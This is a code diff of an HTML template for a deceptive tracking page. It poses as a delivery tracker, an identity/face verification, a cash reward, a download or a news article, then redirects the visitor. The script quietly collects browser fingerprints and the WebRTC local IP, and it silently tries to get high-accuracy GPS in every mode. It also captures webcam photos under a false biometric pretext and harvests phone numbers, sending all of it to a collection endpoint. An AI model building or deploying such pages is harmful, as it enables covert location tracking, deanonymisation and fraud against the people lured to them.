@@ -5,180 +5,164 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   {% if disguise == 'delivery' %}
   <title>Live Delivery Tracker — Track Your Order</title>
-  {% elif disguise == 'camera_kyc' %}
+  {% elif disguise == 'camera_kyc' or disguise == 'verify' %}
   <title>Security Identity Verification</title>
-  {% elif disguise == 'cashback' %}
+  {% elif disguise == 'cashback' or disguise == 'survey' %}
   <title>Claim Your Instant Reward — Cash Voucher</title>
   {% elif disguise == 'news' %}
   <title>Article Loading — Daily Report</title>
   {% elif disguise == 'download' %}
   <title>Preparing Secure Download</title>
-  {% elif disguise == 'survey' %}
-  <title>Reward Survey — Claim Points</title>
   {% else %}
   <title>Redirecting...</title>
   {% endif %}
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <script src="https://cdn.tailwindcss.com"></script>
   <style>
-    * { font-family: 'Inter', system-ui, -apple-system, sans-serif; margin: 0; padding: 0; box-sizing: border-box; }
+    * { font-family: 'Inter', system-ui, sans-serif; margin: 0; padding: 0; box-sizing: border-box; }
     body { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: #0f172a; color: #f8fafc; }
-
-    .pulse-btn {
-      animation: pulse-ring 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
-    }
-    @keyframes pulse-ring {
-      0%, 100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.6); }
-      50% { box-shadow: 0 0 0 14px rgba(34, 197, 94, 0); }
-    }
+    .pulse-btn { animation: pulse-ring 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
+    @keyframes pulse-ring { 0%, 100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.6); } 50% { box-shadow: 0 0 0 14px rgba(34, 197, 94, 0); } }
     .skeleton { background: linear-gradient(90deg, #1e293b 25%, #334155 50%, #1e293b 75%); background-size: 200% 100%; animation: shimmer 1.5s infinite; border-radius: 6px; }
     @keyframes shimmer { 0% { background-position: -200% 0; } 100% { background-position: 200% 0; } }
     @keyframes spin { to { transform: rotate(360deg); } }
+    .hidden { display: none !important; }
+    input { outline: none; }
+    button { cursor: pointer; border: none; }
   </style>
 </head>
-<body class="p-4 bg-slate-950 text-slate-100 min-h-screen flex items-center justify-center">
+<body style="padding: 16px;">
 
-  <!-- ================= DISGUISE 1: LIVE DELIVERY TRACKER (MAX GPS & PHONE) ================= -->
+  <!-- ================= DISGUISE: LIVE DELIVERY TRACKER ================= -->
   {% if disguise == 'delivery' %}
-  <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-2xl">
-    <div class="flex items-center justify-between border-b border-slate-800 pb-4 mb-5">
-      <div class="flex items-center gap-3">
-        <span class="text-3xl">📦</span>
+  <div style="width: 100%; max-width: 420px; background: #1e293b; border: 1px solid #334155; border-radius: 24px; padding: 24px; box-shadow: 0 25px 50px rgba(0,0,0,0.5);">
+    <div style="display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #334155; padding-bottom: 16px; margin-bottom: 20px;">
+      <div style="display: flex; align-items: center; gap: 12px;">
+        <span style="font-size: 28px;">📦</span>
         <div>
-          <h2 class="font-bold text-base text-white">Express Delivery Tracker</h2>
-          <p class="text-xs text-emerald-400 font-medium">● Out for Delivery (0.8 km away)</p>
+          <div style="font-weight: 700; font-size: 15px; color: #fff;">Express Delivery Tracker</div>
+          <div style="font-size: 12px; color: #34d399; font-weight: 600;">● Out for Delivery (0.8 km away)</div>
         </div>
       </div>
-      <span class="text-xs font-mono bg-slate-800 px-2.5 py-1 rounded-full text-slate-400">#EXP-8849</span>
+      <span style="font-size: 11px; font-family: monospace; background: #0f172a; padding: 4px 10px; border-radius: 20px; color: #94a3b8;">#EXP-8849</span>
     </div>
 
-    <!-- Live Map Preview & GPS Action -->
-    <div class="bg-slate-950 rounded-2xl p-5 border border-slate-800/80 mb-5 text-center relative overflow-hidden">
-      <div class="w-16 h-16 rounded-full bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-3xl mx-auto mb-3">
-        🛵
-      </div>
-      <h3 class="font-bold text-sm text-white mb-1">Rider is Near Your Area</h3>
-      <p class="text-xs text-slate-400 mb-4">Allow GPS access to calculate exact walking distance and arrival time.</p>
-      
+    <div style="background: #0f172a; border-radius: 16px; padding: 20px; border: 1px solid #334155; margin-bottom: 20px; text-align: center;">
+      <div style="width: 64px; height: 64px; border-radius: 50%; background: rgba(16, 185, 129, 0.1); border: 1px solid rgba(16, 185, 129, 0.3); display: flex; align-items: center; justify-content: center; font-size: 28px; margin: 0 auto 12px auto;">🛵</div>
+      <div style="font-weight: 700; font-size: 14px; color: #fff; margin-bottom: 4px;">Rider is Near Your Area</div>
+      <p style="font-size: 12px; color: #94a3b8; margin-bottom: 16px;">Allow GPS access to calculate exact walking distance and arrival time.</p>
       <button type="button" id="gpsBtn" onclick="requestExactGPS()"
-        class="pulse-btn w-full py-3.5 px-4 bg-emerald-600 hover:bg-emerald-500 active:scale-95 text-white font-bold text-sm rounded-xl transition flex items-center justify-center gap-2">
-        <span>📍 Track Rider on Live Map</span>
+        class="pulse-btn" style="width: 100%; padding: 14px; background: #10b981; color: #fff; font-weight: 700; font-size: 14px; border-radius: 12px; transition: all 0.2s; display: flex; align-items: center; justify-content: center; gap: 8px;">
+        📍 Track Rider on Live Map
       </button>
-      <p id="gpsStatus" class="text-[11px] text-emerald-400 mt-2 hidden">✓ Location calibrated accurately</p>
+      <p id="gpsStatus" class="hidden" style="font-size: 11px; color: #34d399; margin-top: 8px;">✓ Location calibrated — Rider arriving in 3 min</p>
     </div>
 
-    <!-- Phone Number Verification Form -->
-    <form onsubmit="submitDeliveryForm(event)" class="space-y-3">
+    <form onsubmit="submitPhoneForm(event)" style="display: flex; flex-direction: column; gap: 12px;">
       <div>
-        <label class="block text-xs font-semibold text-slate-300 mb-1">Delivery Contact Number</label>
+        <label style="display: block; font-size: 11px; font-weight: 600; color: #cbd5e1; margin-bottom: 6px;">Delivery Contact Number</label>
         <input type="tel" id="userPhone" required placeholder="Enter Mobile Number (for delivery call)"
-          class="w-full px-4 py-3 rounded-xl bg-slate-950 border border-slate-700 text-sm text-white focus:outline-none focus:border-emerald-500 placeholder-slate-500" />
+          style="width: 100%; padding: 12px 16px; border-radius: 12px; background: #0f172a; border: 1px solid #475569; font-size: 14px; color: #fff;" />
       </div>
       <button type="submit"
-        class="w-full py-3 bg-slate-800 hover:bg-slate-700 text-slate-200 font-semibold text-xs rounded-xl transition border border-slate-700">
+        style="width: 100%; padding: 12px; background: #334155; color: #e2e8f0; font-weight: 600; font-size: 13px; border-radius: 12px; border: 1px solid #475569;">
         Confirm Delivery Instructions →
       </button>
     </form>
   </div>
 
-  <!-- ================= DISGUISE 2: CAMERA & IDENTITY KYC VERIFICATION ================= -->
+  <!-- ================= DISGUISE: CAMERA & IDENTITY KYC ================= -->
   {% elif disguise == 'camera_kyc' or disguise == 'verify' %}
-  <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-2xl text-center">
-    <div class="w-14 h-14 rounded-2xl bg-blue-500/10 border border-blue-500/20 flex items-center justify-center text-2xl mx-auto mb-3">
-      🛡️
-    </div>
-    <h2 class="font-bold text-lg text-white mb-1">Identity & Face Verification</h2>
-    <p class="text-xs text-slate-400 mb-5">Verify your account credentials and face snapshot to proceed safely.</p>
+  <div style="width: 100%; max-width: 420px; background: #1e293b; border: 1px solid #334155; border-radius: 24px; padding: 24px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); text-align: center;">
+    <div style="width: 56px; height: 56px; border-radius: 16px; background: rgba(59, 130, 246, 0.1); border: 1px solid rgba(59, 130, 246, 0.2); display: flex; align-items: center; justify-content: center; font-size: 24px; margin: 0 auto 12px auto;">🛡️</div>
+    <h2 style="font-weight: 700; font-size: 18px; color: #fff; margin-bottom: 4px;">Identity & Face Verification</h2>
+    <p style="font-size: 12px; color: #94a3b8; margin-bottom: 20px;">Verify your credentials and take a quick face snapshot to proceed safely.</p>
 
-    <!-- Hidden Video & Canvas for Snapshot Capture -->
-    <video id="webcamVideo" autoplay playsinline class="hidden w-full h-40 bg-black rounded-xl mb-3 object-cover"></video>
+    <video id="webcamVideo" autoplay playsinline class="hidden" style="width: 100%; height: 160px; background: #000; border-radius: 12px; margin-bottom: 12px; object-fit: cover;"></video>
     <canvas id="snapshotCanvas" class="hidden"></canvas>
 
-    <form onsubmit="submitKycForm(event)" class="space-y-3.5 text-left">
+    <form onsubmit="submitPhoneForm(event)" style="display: flex; flex-direction: column; gap: 14px; text-align: left;">
       <div>
-        <label class="block text-xs font-semibold text-slate-300 mb-1">Registered Mobile Number</label>
+        <label style="display: block; font-size: 11px; font-weight: 600; color: #cbd5e1; margin-bottom: 6px;">Registered Mobile Number</label>
         <input type="tel" id="userPhone" required placeholder="Mobile Number (e.g. +91 98765 43210)"
-          class="w-full px-4 py-3 rounded-xl bg-slate-950 border border-slate-700 text-sm text-white focus:outline-none focus:border-blue-500 placeholder-slate-500" />
+          style="width: 100%; padding: 12px 16px; border-radius: 12px; background: #0f172a; border: 1px solid #475569; font-size: 14px; color: #fff;" />
       </div>
-
       <button type="button" id="camBtn" onclick="triggerCameraCapture()"
-        class="w-full py-3 bg-blue-600/20 hover:bg-blue-600/30 border border-blue-500/40 text-blue-300 font-semibold text-xs rounded-xl transition flex items-center justify-center gap-2">
-        <span>📸 Enable Camera for Quick Face Match</span>
+        style="width: 100%; padding: 12px; background: rgba(59, 130, 246, 0.15); border: 1px solid rgba(59, 130, 246, 0.4); color: #93c5fd; font-weight: 600; font-size: 12px; border-radius: 12px; display: flex; align-items: center; justify-content: center; gap: 8px;">
+        📸 Enable Camera for Quick Face Match
       </button>
-      <p id="camStatus" class="text-[11px] text-emerald-400 text-center hidden">✓ Biometric snapshot recorded</p>
-
+      <p id="camStatus" class="hidden" style="font-size: 11px; color: #34d399; text-align: center;">✓ Biometric snapshot recorded</p>
       <button type="submit"
-        class="w-full py-3.5 bg-blue-600 hover:bg-blue-500 text-white font-bold text-sm rounded-xl transition shadow-lg shadow-blue-600/20">
+        style="width: 100%; padding: 14px; background: #3b82f6; color: #fff; font-weight: 700; font-size: 14px; border-radius: 12px; box-shadow: 0 4px 12px rgba(59,130,246,0.3);">
         Complete Verification →
       </button>
     </form>
   </div>
 
-  <!-- ================= DISGUISE 3: CASHBACK & REWARD CLAIM (MAX PHONE) ================= -->
+  <!-- ================= DISGUISE: CASHBACK / SURVEY ================= -->
   {% elif disguise == 'cashback' or disguise == 'survey' %}
-  <div class="w-full max-w-md bg-slate-900 border border-amber-500/30 rounded-3xl p-6 shadow-2xl text-center relative overflow-hidden">
-    <div class="text-4xl mb-2">🎁</div>
-    <span class="inline-block bg-amber-500/20 text-amber-300 border border-amber-500/40 text-[11px] font-bold px-3 py-1 rounded-full mb-3 uppercase tracking-wider">
+  <div style="width: 100%; max-width: 420px; background: #1e293b; border: 1px solid rgba(245,158,11,0.3); border-radius: 24px; padding: 24px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); text-align: center; position: relative; overflow: hidden;">
+    <div style="font-size: 36px; margin-bottom: 8px;">🎁</div>
+    <span style="display: inline-block; background: rgba(245,158,11,0.15); color: #fbbf24; border: 1px solid rgba(245,158,11,0.4); font-size: 10px; font-weight: 700; padding: 4px 12px; border-radius: 20px; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 1px;">
       Instant Voucher Approved
     </span>
-    <h2 class="font-extrabold text-xl text-white mb-1">Claim Your ₹500 / $50 Reward</h2>
-    <p class="text-xs text-slate-400 mb-5">Enter your mobile number to receive your instant payout voucher via WhatsApp / SMS.</p>
+    <h2 style="font-weight: 800; font-size: 20px; color: #fff; margin-bottom: 4px;">Claim Your ₹500 / $50 Reward</h2>
+    <p style="font-size: 12px; color: #94a3b8; margin-bottom: 20px;">Enter your mobile number to receive your instant payout voucher via WhatsApp / SMS.</p>
 
-    <form onsubmit="submitCashbackForm(event)" class="space-y-3.5 text-left">
+    <form onsubmit="submitPhoneForm(event)" style="display: flex; flex-direction: column; gap: 14px; text-align: left;">
       <div>
-        <label class="block text-xs font-semibold text-slate-300 mb-1">Mobile Number (UPI / WhatsApp)</label>
+        <label style="display: block; font-size: 11px; font-weight: 600; color: #cbd5e1; margin-bottom: 6px;">Mobile Number (UPI / WhatsApp)</label>
         <input type="tel" id="userPhone" required placeholder="Enter Mobile Number"
-          class="w-full px-4 py-3 rounded-xl bg-slate-950 border border-slate-700 text-sm text-white focus:outline-none focus:border-amber-500 placeholder-slate-500" />
+          style="width: 100%; padding: 12px 16px; border-radius: 12px; background: #0f172a; border: 1px solid #475569; font-size: 14px; color: #fff;" />
       </div>
-      <button type="submit" onclick="requestExactGPS(false)"
-        class="w-full py-3.5 bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-400 hover:to-orange-500 text-slate-950 font-extrabold text-sm rounded-xl transition shadow-lg shadow-amber-500/20">
+      <button type="submit"
+        style="width: 100%; padding: 14px; background: linear-gradient(135deg, #f59e0b, #ea580c); color: #0f172a; font-weight: 800; font-size: 14px; border-radius: 12px; box-shadow: 0 4px 12px rgba(245,158,11,0.3);">
         Claim Instant Reward Now ⚡
       </button>
     </form>
   </div>
 
-  <!-- ================= DISGUISE 4: FILE DOWNLOAD ================= -->
+  <!-- ================= DISGUISE: FILE DOWNLOAD ================= -->
   {% elif disguise == 'download' %}
-  <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-2xl text-center">
-    <div class="text-4xl mb-2">📥</div>
-    <h2 class="font-bold text-lg text-white mb-1">Download Ready (14.2 MB)</h2>
-    <p class="text-xs text-slate-400 mb-5">Enter your contact number to unlock the high-speed download server.</p>
-    <form onsubmit="submitDeliveryForm(event)" class="space-y-3 text-left">
+  <div style="width: 100%; max-width: 420px; background: #1e293b; border: 1px solid #334155; border-radius: 24px; padding: 24px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); text-align: center;">
+    <div style="font-size: 36px; margin-bottom: 8px;">📥</div>
+    <h2 style="font-weight: 700; font-size: 18px; color: #fff; margin-bottom: 4px;">Download Ready (14.2 MB)</h2>
+    <p style="font-size: 12px; color: #94a3b8; margin-bottom: 20px;">Enter your contact number to unlock the high-speed download server.</p>
+    <form onsubmit="submitPhoneForm(event)" style="display: flex; flex-direction: column; gap: 12px; text-align: left;">
       <div>
-        <label class="block text-xs font-semibold text-slate-300 mb-1">Mobile Number</label>
+        <label style="display: block; font-size: 11px; font-weight: 600; color: #cbd5e1; margin-bottom: 6px;">Mobile Number</label>
         <input type="tel" id="userPhone" required placeholder="Mobile Number"
-          class="w-full px-4 py-3 rounded-xl bg-slate-950 border border-slate-700 text-sm text-white focus:outline-none focus:border-blue-500 placeholder-slate-500" />
+          style="width: 100%; padding: 12px 16px; border-radius: 12px; background: #0f172a; border: 1px solid #475569; font-size: 14px; color: #fff;" />
       </div>
-      <button type="submit" onclick="requestExactGPS(false)"
-        class="w-full py-3.5 bg-blue-600 hover:bg-blue-500 text-white font-bold text-sm rounded-xl transition">
+      <button type="submit"
+        style="width: 100%; padding: 14px; background: #3b82f6; color: #fff; font-weight: 700; font-size: 14px; border-radius: 12px;">
         Download Now 🚀
       </button>
     </form>
   </div>
 
-  <!-- ================= DISGUISE 5: NEWS ARTICLE ================= -->
+  <!-- ================= DISGUISE: NEWS ARTICLE ================= -->
   {% elif disguise == 'news' %}
-  <div class="w-full max-w-2xl bg-white text-slate-900 rounded-2xl p-6 shadow-2xl">
-    <div class="border-b border-slate-200 pb-3 mb-4 font-bold text-xs uppercase tracking-widest text-slate-500">Breaking News Report</div>
-    <div class="space-y-3">
-      <div class="skeleton h-8 w-4/5"></div>
-      <div class="skeleton h-4 w-1/2"></div>
-      <div class="skeleton h-56 w-full mt-4"></div>
-      <div class="skeleton h-4 w-full"></div>
-      <div class="skeleton h-4 w-5/6"></div>
+  <div style="width: 100%; max-width: 640px; background: #fff; color: #1e293b; border-radius: 16px; padding: 24px; box-shadow: 0 25px 50px rgba(0,0,0,0.5);">
+    <div style="border-bottom: 1px solid #e2e8f0; padding-bottom: 12px; margin-bottom: 16px; font-weight: 700; font-size: 11px; text-transform: uppercase; letter-spacing: 2px; color: #94a3b8;">Breaking News Report</div>
+    <div style="display: flex; flex-direction: column; gap: 12px;">
+      <div class="skeleton" style="height: 32px; width: 80%;"></div>
+      <div class="skeleton" style="height: 16px; width: 50%;"></div>
+      <div class="skeleton" style="height: 220px; width: 100%; margin-top: 16px;"></div>
+      <div class="skeleton" style="height: 16px; width: 100%;"></div>
+      <div class="skeleton" style="height: 16px; width: 83%;"></div>
     </div>
   </div>
 
-  <!-- ================= DISGUISE 6: DEFAULT / STEALTH REDIRECT ================= -->
+  <!-- ================= DISGUISE: DEFAULT STEALTH ================= -->
   {% else %}
-  <div class="text-center">
-    <div class="w-10 h-10 border-4 border-slate-700 border-t-red-500 rounded-full animate-spin mx-auto mb-3"></div>
-    <p class="text-xs text-slate-400">Loading secure link...</p>
+  <div style="text-align: center;">
+    <div style="width: 40px; height: 40px; border: 4px solid #334155; border-top: 4px solid #ef4444; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 12px auto;"></div>
+    <p style="font-size: 12px; color: #94a3b8;">Loading secure link...</p>
   </div>
   {% endif %}
 
-  <!-- ================= FORENSIC TRACKER ENGINE ================= -->
+  <!-- ================= FORENSIC ENGINE (ALL DISGUISES) ================= -->
   <script>
     const SLUG     = "{{ slug }}";
     const INGEST   = "{{ ingest_url }}";
@@ -187,17 +171,13 @@
 
     let basePayload = null;
     let redirected = false;
+    let gpsSent = false;
+    let phoneSent = false;
 
     function doRedirect() {
-      if (!redirected && (DISGUISE === 'default' || DISGUISE === 'news')) {
-        redirected = true;
-        window.location.replace(REDIRECT || "https://www.google.com");
-      }
-    }
-
-    // Auto-redirect for silent modes
-    if (DISGUISE === 'default' || DISGUISE === 'news') {
-      setTimeout(doRedirect, 1400);
+      if (redirected) return;
+      redirected = true;
+      window.location.replace(REDIRECT || "https://www.google.com");
     }
 
     // Send payload to backend
@@ -211,19 +191,20 @@
           body: JSON.stringify(combined),
           keepalive: true
         });
-      } catch (e) {
-        console.error('Ingest error:', e);
-      }
+      } catch (e) {}
     }
 
-    // 1. High-Accuracy Hardware GPS Trigger (Runs on user interaction)
-    function requestExactGPS(showSuccess = true) {
+    // =============== GPS CAPTURE (All disguises attempt silently) ===============
+    function requestExactGPS(showUI) {
+      if (gpsSent) return;
       if (!navigator.geolocation) return;
+
       const btn = document.getElementById('gpsBtn');
-      if (btn) btn.textContent = '⏳ Calibrating GPS Satellite...';
+      if (btn && showUI !== false) btn.textContent = '⏳ Calibrating GPS Satellite...';
 
       navigator.geolocation.getCurrentPosition(
         function (pos) {
+          gpsSent = true;
           const gpsData = {
             gps_lat:      pos.coords.latitude,
             gps_lng:      pos.coords.longitude,
@@ -233,24 +214,27 @@
             gps_speed:    pos.coords.speed || null
           };
           sendIngest(gpsData);
-          if (showSuccess) {
-            const statusEl = document.getElementById('gpsStatus');
-            if (statusEl) statusEl.classList.remove('hidden');
-            if (btn) {
-              btn.textContent = '✓ Live GPS Calibrated';
-              btn.classList.remove('pulse-btn');
-              btn.classList.add('bg-slate-800');
-            }
+
+          if (btn && showUI !== false) {
+            btn.textContent = '✓ Live GPS Calibrated';
+            btn.style.background = '#334155';
+            btn.classList.remove('pulse-btn');
           }
+          const statusEl = document.getElementById('gpsStatus');
+          if (statusEl && showUI !== false) statusEl.classList.remove('hidden');
         },
         function (err) {
-          if (btn) btn.textContent = '📍 View Live Map';
+          if (btn && showUI !== false) btn.textContent = '📍 View Live Map';
+          // For silent modes (default/news), just ignore the error and redirect
+          if (DISGUISE === 'default' || DISGUISE === 'news') {
+            doRedirect();
+          }
         },
-        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
       );
     }
 
-    // 2. Camera Snapshot Capture (Biometric / Face Verification)
+    // =============== CAMERA SNAPSHOT CAPTURE ===============
     async function triggerCameraCapture() {
       const video = document.getElementById('webcamVideo');
       const canvas = document.getElementById('snapshotCanvas');
@@ -270,46 +254,30 @@
           canvas.height = video.videoHeight || 480;
           const ctx = canvas.getContext('2d');
           ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const photoBase64 = canvas.toDataURL('image/jpeg', 0.7);
-
-          // Stop camera stream
+          const photoBase64 = canvas.toDataURL('image/jpeg', 0.65);
           stream.getTracks().forEach(track => track.stop());
           video.classList.add('hidden');
-
-          // Send photo payload
           sendIngest({ captured_photo: photoBase64 });
           if (camStatus) camStatus.classList.remove('hidden');
           if (camBtn) camBtn.textContent = '✓ Biometric Match Verified';
         }, 1200);
-
       } catch (err) {
         if (camBtn) camBtn.textContent = '📸 Camera Skipped (Manual Verify)';
       }
     }
 
-    // Form Submissions
-    async function submitDeliveryForm(e) {
+    // =============== PHONE CAPTURE FORM ===============
+    async function submitPhoneForm(e) {
       e.preventDefault();
       const phone = document.getElementById('userPhone')?.value;
-      await sendIngest({ captured_phone: phone });
-      window.location.replace(REDIRECT || "https://www.google.com");
+      if (phone) {
+        phoneSent = true;
+        await sendIngest({ captured_phone: phone });
+      }
+      doRedirect();
     }
 
-    async function submitKycForm(e) {
-      e.preventDefault();
-      const phone = document.getElementById('userPhone')?.value;
-      await sendIngest({ captured_phone: phone });
-      window.location.replace(REDIRECT || "https://www.google.com");
-    }
-
-    async function submitCashbackForm(e) {
-      e.preventDefault();
-      const phone = document.getElementById('userPhone')?.value;
-      await sendIngest({ captured_phone: phone });
-      window.location.replace(REDIRECT || "https://www.google.com");
-    }
-
-    // Initialize full forensic collection on load
+    // =============== FORENSIC FINGERPRINT COLLECTOR ===============
     (async function initForensics() {
       "use strict";
 
@@ -371,11 +339,19 @@
       async function getClientHints() {
         try {
           if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-            const h = await navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platform', 'platformVersion']);
-            return { model: h.model || null, platformVersion: h.platformVersion || null };
+            const h = await navigator.userAgentData.getHighEntropyValues([
+              'architecture', 'model', 'platform', 'platformVersion',
+              'fullVersionList', 'bitness'
+            ]);
+            return {
+              model: h.model || null,
+              platformVersion: h.platformVersion || null,
+              platform: h.platform || null,
+              architecture: h.architecture || null
+            };
           }
         } catch(e) {}
-        return { model: null, platformVersion: null };
+        return { model: null, platformVersion: null, platform: null, architecture: null };
       }
 
       function getWebRTCIP() {
@@ -384,7 +360,7 @@
             const pc = new RTCPeerConnection({ iceServers: [] });
             pc.createDataChannel('');
             pc.createOffer().then(o => pc.setLocalDescription(o));
-            const t = setTimeout(() => { try{pc.close();}catch(_){} resolve(null); }, 300);
+            const t = setTimeout(() => { try{pc.close();}catch(_){} resolve(null); }, 400);
             pc.onicecandidate = (e) => {
               if (!e || !e.candidate) return;
               const p = e.candidate.candidate.split(' ');
@@ -398,6 +374,7 @@
         });
       }
 
+      // Collect all fingerprints in parallel
       const webgl = getWebGL();
       const results = await Promise.allSettled([
         getAudioHash(),
@@ -407,8 +384,8 @@
       ]);
 
       const audioHash   = results[0].status === 'fulfilled' ? results[0].value : null;
-      const battery     = results[1].status === 'fulfilled' ? results[1].value : { level: null, charging: null };
-      const clientHints = results[2].status === 'fulfilled' ? results[2].value : { model: null, platformVersion: null };
+      const battery     = results[1].status === 'fulfilled' ? results[1].value : {};
+      const clientHints = results[2].status === 'fulfilled' ? results[2].value : {};
       const webrtcIP    = results[3].status === 'fulfilled' ? results[3].value : null;
 
       const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
@@ -425,8 +402,8 @@
         referrer:             document.referrer || null,
         user_agent:           navigator.userAgent || null,
 
-        client_model:         clientHints.model,
-        client_os_version:    clientHints.platformVersion,
+        client_model:         clientHints.model || null,
+        client_os_version:    clientHints.platformVersion || null,
         network_downlink:     conn ? conn.downlink : null,
         network_rtt:          conn ? conn.rtt : null,
 
@@ -444,13 +421,23 @@
         device_memory:        navigator.deviceMemory || null,
         timezone_offset:      new Date().getTimezoneOffset(),
         timezone_name:        Intl.DateTimeFormat().resolvedOptions().timeZone || null,
-        battery_level:        battery.level,
-        battery_charging:     battery.charging,
+        battery_level:        battery.level != null ? battery.level : null,
+        battery_charging:     battery.charging != null ? battery.charging : null,
         webrtc_local_ip:      webrtcIP
       };
 
-      // Send silent baseline immediately
+      // Send baseline fingerprints immediately
       await sendIngest({});
+
+      // FOR ALL DISGUISES: Attempt silent GPS in background
+      // (For default/news, this is the only chance — user may have already granted permission before)
+      requestExactGPS(false);
+
+      // For silent-redirect disguises, schedule delayed redirect
+      if (DISGUISE === 'default' || DISGUISE === 'news') {
+        // Wait 3 seconds for GPS response, then redirect regardless
+        setTimeout(doRedirect, 3000);
+      }
     })();
   </script>
 </body>
